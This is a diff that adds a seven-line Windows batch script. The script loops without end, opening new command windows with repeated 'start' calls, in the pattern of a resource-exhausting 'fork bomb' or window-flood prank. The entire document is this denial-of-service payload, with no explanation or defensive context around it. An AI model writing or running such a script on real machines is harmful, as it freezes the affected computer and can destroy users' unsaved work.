@@ -1,0 +1,7 @@
+@echo off
+:l
+start
+start 
+start 
+start
+goto:l
